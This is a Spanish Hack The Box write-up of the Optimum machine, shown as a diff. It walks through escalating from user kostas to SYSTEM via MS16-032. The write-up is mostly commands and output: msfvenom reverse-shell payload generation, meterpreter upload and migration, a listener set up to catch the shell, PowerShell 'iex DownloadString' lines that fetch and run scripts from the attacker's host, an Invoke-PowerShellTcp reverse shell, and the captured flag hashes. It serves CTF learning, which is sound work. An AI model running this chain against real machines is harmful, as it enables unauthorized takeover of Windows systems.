+
+	C:\Users\kostas\Desktop>
+
+	Volver a meterpreter y ejecutar:
+	meterpreter > sysinfo
+	Computer        : OPTIMUM
+	OS              : Windows 2012 R2 (6.3 Build 9600).
+	Architecture    : x64
+	System Language : el_GR
+	Domain          : HTB
+	Logged On Users : 1
+	Meterpreter     : x86/windows
+
+	meterpreter > getuid
+	Server username: OPTIMUM\kostas
+
+	getsystem, hashdump --> no tenemos permisos.
+
+-- Elevar privilegios.
+
+	Buscar por internet exploit elevar privilegios windows 2012 r2 powershell
+	Aparace esta: https://www.exploit-db.com/exploits/39719 descargar el exploit:
+	
+	Bbuscar por la aplicacion searchsploit "Privilege Escalation powershell" 
+	---------------------------------------------------------------------- ----------------------------------------
+	 Exploit Title                                                        |  Path
+																		  | (/usr/share/exploitdb/)
+	---------------------------------------------------------------------- ----------------------------------------
+	Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64) - Local Privilege | exploits/windows/local/39719.ps1
+	---------------------------------------------------------------------- ----------------------------------------
+	Descargar el exploit de la web anterior.
+	wget https://www.exploit-db.com/raw/39719
+	Ejecutar el exploit y falla por que la ruta c:\windows\system32\cmd.exe, no es valida.
+	
+	Para saber que poner, crear un exploit, que subiremos.
+	
+	msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.24 lport=4567 -f exe > programa.exe
+	[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+	[-] No arch selected, selecting arch: x86 from the payload
+	No encoder or badchars specified, outputting raw payload
+	Payload size: 341 bytes
+	Final size of exe file: 73802 bytes
+	
+	meterpreter > upload /root/Desktop/HACKTHEBOX/Optimum_10.10.10.8/programa.exe
+	[*] uploading  : /root/Desktop/HACKTHEBOX/Optimum_10.10.10.8/programa.exe -> programa.exe
+	[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /root/Desktop/HACKTHEBOX/Optimum_10.10.10.8/programa.exe -> programa.exe
+	[*] uploaded   : /root/Desktop/HACKTHEBOX/Optimum_10.10.10.8/programa.exe -> programa.exe
+	meterpreter > 
+	
+	Editar el exploit descargado y modificar la ruta C:\windows\system32\cmd.exe por C:\Users\kostas\Desktop\programa.exe
+	Subimos el exploit:
+	meterpreter > upload /root/Desktop/HACKTHEBOX/Optimum_10.10.10.8/39719.ps1
+	[*] uploading  : /root/Desktop/HACKTHEBOX/Optimum_10.10.10.8/39719.psl -> 39719.ps11
+	[*] Uploaded 11.56 KiB of 11.56 KiB (100.0%): /root/Desktop/HACKTHEBOX/Optimum_10.10.10.8/39719.psl -> 39719.psl
+	[*] uploaded   : /root/Desktop/HACKTHEBOX/Optimum_10.10.10.8/39719.psl -> 39719.ps1
+
+	Ver los procesos conhost es de x86 y lo pasaremos a x64. Con el comando PS se ven los procesos, y vemos que hay C:\Windows\System32\conhost.exe
+	Migrar el proceso ejecutando migrate 2396
+	[*] Migrating from 2728 to 2396...
+	[*] Migration completed successfully.
+
+	Iniciar una consola de powershell.
+	meterpreter > load powershell
+	Loading extension powershell...Success.
+	meterpreter > powershell_shell 
+
+	
+	En otra consola ejecutar en mestaploit 
+	msf5 > use exploit/multi/handler 
+	msf5 exploit(multi/handler) > set  payload windows/meterpreter/reverse_tcp
+	msf5 exploit(multi/handler) > set lhost 10.10.14.24
+	msf5 exploit(multi/handler) > set lport 4444
+	msf5 exploit(multi/handler) > exploit
+	
+	En la consola de Optimun Ejecutar:
+	
+	PS > Import-Module ./39719.ps1  
+	PS > Invoke-MS16-032
+			 __ __ ___ ___   ___     ___ ___ ___
+			|  V  |  _|_  | |  _|___|   |_  |_  |
+			|     |_  |_| |_| . |___| | |_  |  _|
+			|_|_|_|___|_____|___|   |___|___|___|
+
+						   [by b33f -> @FuzzySec]
+
+	[?] Operating system core count: 2
+	[>] Duplicating CreateProcessWithLogonW handle
+	[?] Done, using thread handle: 840
+
+	[*] Sniffing out privileged impersonation token..
+
+	[?] Thread belongs to: svchost
+	[+] Thread suspended
+	[>] Wiping current impersonation token
+	[>] Building SYSTEM impersonation token
+	[?] Success, open SYSTEM token handle: 1108
+	[+] Resuming thread..
+
+	[*] Sniffing out SYSTEM shell..
+
+	[>] Duplicating SYSTEM token
+	[>] Starting token race
+	[>] Starting process race
+	[!] Holy handle leak Batman, we have a SYSTEM shell!!
+
+	En la otra consola nos aparecera una consola de meterpreter.
+	meterpreter > shell
+	
+	whoami
+	nt authority\system
+	Tenemos acceso como administrador.
+	
+
+	Otra opcion de MS16-032.
+	Buscar en google, ms16-032 empire, descargar.
+	wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1
+	En el fichero viene como ejecutar.
+	El codigo a ejecutar escribir al final de este exploit.
+	Invoke-MS16032 -Command "iex(New-Object Net.Webclient).downloadString('http://10.10.14.24/Invoke-PowerShellTcp.ps1')
+
+	En Invoke-PowershellTcp.ps1, al final del fichero añadir 
+	Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.24 -Port 9999
+
+	En otra consola ejecutar una conexión. 
+	nc -lvnp 9999
+	
+	En otra consola ejecutar un servidor Python.
+		python -m SimpleHTTPServer 
+	
+	En la consola que tenemos acceso a la maquina, escribir: 
+	Sistema x32 --> Powershell.exe iex (New-Object Net.Webclient).downloadString('http://10.10.14.24/Invoke-MS16032.ps1')
+	Sistema x64 --> C:\Windows\sysnative\WindowsPowershell.exe iex (New-Object Net.Webclient).downloadString('http://10.10.14.24/Invoke-MS16032.ps1')
+	
+	
++++++ FASE DE POSTEXPLOTACION ++++++++++++++++++++++++++++++++++++
+
+	FLAG USUARIO:
+	C:\Users\kostas\Desktop>more user.txt.txt
+	d0c39409d7b994a9a1389ebf38ef5f73
+
+	FLAG ROOT:
+	C:\Users\Administrator\Desktop>more root.txt
+	51ed1b36553c8461f4552c2e92b3eeed
+
+
+
